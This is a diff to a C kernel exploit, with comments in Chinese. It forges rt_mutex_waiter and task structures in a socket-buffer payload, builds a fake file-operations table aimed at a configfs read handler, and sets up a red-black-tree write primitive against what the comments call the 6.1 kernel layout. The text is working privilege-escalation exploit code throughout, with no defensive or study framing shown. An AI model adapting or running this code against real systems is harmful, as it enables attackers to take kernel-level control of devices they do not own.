@@ -254,11 +254,11 @@ int has_zero_byte(uintptr_t value) {
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+  return P0_PAGE_OFFSET + phys;   /* LOAD 版: 与 common.h P0_DATA_ALIAS_CONST 一致 */
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;   /* LOAD 版 */
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -295,7 +295,7 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
   put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+        fake_w0 + WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -501,20 +501,31 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    /* 6.1 legacy rt_mutex_waiter 布局(WAITER_* 偏移,与真机反汇编一致):
+     * tree_entry(rb_node)@0x00 / pi_tree_entry@0x18 / task@0x30 / lock@0x38
+     * wake_state@0x40 / prio@0x44 / deadline@0x48 / ww_ctx@0x50 */
+    put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x00, 1);  /* parent_color:染黑 RB_BLACK */
+    put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 0);  /* rb_right */
+    put64(p, W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 0);  /* rb_left  */
+    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+      /* SLIDE: fake_w0 仅作干净树根(染黑空),写原语由栈上 fake waiter 的
+       * tree_entry 承担;若填 write_pc(红)/write_left(boot_id) 会让
+       * rb_insert_color 沿假子树解引用 boot_id → panic */
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, 1);  /* 染黑 */
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, 0);
+    } else {
+      /* FOPS: fake_w0 pi_tree 作为写原语载体(删除时把 write_pc 写进目标) */
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    }
+    put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
+    put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
+    put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
+    put32(p, W0_OFF + WAITER_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -525,9 +536,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+            fake_w0 + WAITER_PI_TREE_ENTRY_OFF);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+            fake_w0 + WAITER_PI_TREE_ENTRY_OFF);
     }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
